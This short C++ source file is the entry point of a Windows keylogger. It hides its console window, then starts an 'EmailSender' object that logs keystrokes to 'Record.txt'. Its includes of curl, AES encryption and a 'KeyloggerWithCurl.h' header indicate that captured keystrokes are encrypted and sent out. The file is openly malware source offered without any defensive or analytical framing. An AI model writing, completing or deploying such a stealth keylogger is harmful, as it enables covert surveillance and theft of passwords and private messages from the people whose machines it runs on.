#include<iostream>
#include<fstream>
#include<string>
#include<cstring>
#include<windows.h>
#include<winuser.h>
#include<curl/curl.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/base64.h> 
#include "KeyloggerWithCurl.h"
using namespace std;

int main()
{
   
    // Get the console window handle and hide the console window
    HWND hwnd = GetConsoleWindow(); 
    ShowWindow(hwnd, SW_HIDE);      
    // Create an instance of the EmailSender class
    EmailSender e;
    //storing filename
    const string logFilename = "Record.txt";
    // Call the log method to start the keylogging process
        e.log(logFilename);

    return 0;

}